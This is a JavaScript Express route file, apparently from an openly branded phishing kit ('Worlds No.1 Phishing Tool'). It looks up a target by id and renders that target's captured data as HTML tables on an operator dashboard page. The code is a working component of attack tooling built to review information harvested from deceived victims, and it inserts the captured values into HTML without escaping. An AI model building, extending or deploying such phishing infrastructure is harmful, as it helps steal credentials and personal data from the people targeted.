/**
 * 
 * @Author      : Madhan (Madhanmaaz) - madhan hacker
 * github       : https://github.com/madhanmaaz
 * website      : http://madhanmaaz.netlify.app/
 * Description  : Worlds No.1 Phishing Tool.
 * 
 */

const express = require("express")
const app = express.Router()
const { checkId } = require("../utils/utils")


app.get("/", async (req, res) => {
    const { id } = req.query
    const page = checkId(id)

    if (page) { // checking if the target data is present
        let html = ""
        for (const data of page.data) {
            html += terminalTable(data)
        }
        res.render("db", {
            html,
            page
        })
    } else {
        res.send("ERROR ID NOT FOUND")
    }
})

function terminalTable(data) { // table format 
    let text = ''
    for (let a in data) {
        if (data[a] == '[object Object]') {
            let tText = ''
            for (let b in data[a]) {
                tText += `<li>${b} : ${data[a][b]}</li>`
            }
            text += `<tr><th>${a}</th><td>${tText}</td></tr>`
        } else {
            text += `<tr><th>${a}</th> <td>${data[a]}</td></tr>`
        }
    }
    return `<table>${text}</table>`
}

module.exports = app